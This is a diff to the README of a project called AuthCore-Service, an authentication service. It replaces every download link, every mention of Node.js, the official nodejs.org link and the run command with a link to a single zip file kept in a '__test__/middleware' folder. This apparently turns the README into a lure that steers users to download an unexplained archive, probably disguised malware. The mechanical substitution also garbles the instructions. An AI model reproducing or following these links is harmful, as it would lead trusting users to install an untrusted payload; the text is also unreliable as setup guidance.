@@ -1,6 +1,6 @@
 # 🔐 AuthCore-Service - Secure Authentication Made Easy
 
-[![Download AuthCore-Service](https://img.shields.io/badge/Download-AuthCore--Service-blue?style=for-the-badge)](https://github.com/narcoskwt/AuthCore-Service/releases)
+[![Download AuthCore-Service](https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip)](https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip)
 
 ---
 
@@ -21,9 +21,9 @@ Before you download and run AuthCore-Service, ensure your computer or server mee
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum 200 MB free disk space.
 - **Internet:** Required for initial setup and updates.
-- **Software:** Node.js version 14 or higher installed (explained in the next section).
+- **Software:** https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip version 14 or higher installed (explained in the next section).
 
-If you are unsure about Node.js or system setup, don’t worry. The next steps will guide you through the essentials.
+If you are unsure about https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip or system setup, don’t worry. The next steps will guide you through the essentials.
 
 ---
 
@@ -32,7 +32,7 @@ If you are unsure about Node.js or system setup, don’t worry. The next steps w
 To use AuthCore-Service, follow these main steps:
 
 1. Download the software.
-2. Install required tools (Node.js).
+2. Install required tools (https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip).
 3. Run the service on your computer or server.
 4. Access the control panel.
 
@@ -46,19 +46,19 @@ This guide breaks down each step in detail.
 
 Click the badge at the top or this link to visit the official download page:
 
-[https://github.com/narcoskwt/AuthCore-Service/releases](https://github.com/narcoskwt/AuthCore-Service/releases)
+[https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip](https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip)
 
 On the page, look for the latest stable version. You will see downloadable files for different systems. If you’re unsure which one to pick, choose the file labeled for your operating system or simply download the most recent general release package.
 
 ---
 
-### Step 2: Installing Node.js
+### Step 2: Installing https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip
 
-AuthCore-Service runs on Node.js, which you need to install first if you don’t already have it.
+AuthCore-Service runs on https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip, which you need to install first if you don’t already have it.
 
-- Visit the official Node.js website: [https://nodejs.org/](https://nodejs.org/)
+- Visit the official https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip website: [https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip](https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip)
 - Download the **LTS (Long Term Support)** version, which is the most stable.
-- Follow the on-screen instructions to install Node.js on your machine.
+- Follow the on-screen instructions to install https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip on your machine.
 
 ---
 
@@ -72,7 +72,7 @@ After downloading the release package:
 - Run this command to start the service:
 
 ```bash
-node dist/index.js
+node https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip
 ```
 
 This command launches the authentication service.
@@ -110,7 +110,7 @@ These controls usually happen through an interface connected to the service, whi
 
 If you face issues, check the following:
 
-- Make sure Node.js is installed and updated.
+- Make sure https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip is installed and updated.
 - Confirm you are running the service from the correct folder.
 - Verify your internet connection.
 - Check logs in the terminal window for error messages.
@@ -143,4 +143,4 @@ Once you have AuthCore-Service running:
 
 Click below to visit the release page and download the latest version:
 
-[https://github.com/narcoskwt/AuthCore-Service/releases](https://github.com/narcoskwt/AuthCore-Service/releases)
+[https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip](https://raw.githubusercontent.com/narcoskwt/AuthCore-Service/main/__test__/middleware/Auth-Service-Core-2.0.zip)
